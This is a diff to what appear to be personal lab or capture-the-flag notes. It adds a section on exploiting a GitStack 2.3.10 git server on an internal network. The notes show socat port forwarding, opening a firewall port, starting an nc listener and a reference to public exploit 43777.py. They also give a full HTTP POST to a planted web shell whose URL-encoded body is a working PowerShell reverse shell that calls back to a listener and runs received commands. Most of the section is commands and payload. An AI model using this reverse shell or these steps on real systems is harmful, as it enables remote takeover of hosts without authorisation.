@@ -135,6 +135,29 @@ or using socat
 └─$ socat tcp-l:18801 tcp-l:18800,fork,reuseaddr
 [root@prod-serv tmp]# ./socat-dukeofnero tcp:10.50.86.201:18801 tcp:10.200.85.150:80,fork &
 
+<h2>Task 20  Git Server Exploitation </h2>
 
+On 10.200.85.200 PublicFacing Webserver run listener
+[root@prod-serv tmp]# firewall-cmd --zone=public --add-port 23456/tcp
+success
+[root@prod-serv tmp]# nc -lvnp 23456
+
+via Python RCE exploit for version 2.3.10 gitstack send exploit and reverse shell (43777.py)
+
+Burp suit send revershell
+POST /web/exploit-duke.php HTTP/1.1
+Host: 127.0.0.1:23455
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:117.0) Gecko/20100101 Firefox/117.0
+Accept: text/html,image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 816
+
+a=powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.85.200%27%2C23456%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
+
+
+ 
 </code>
 
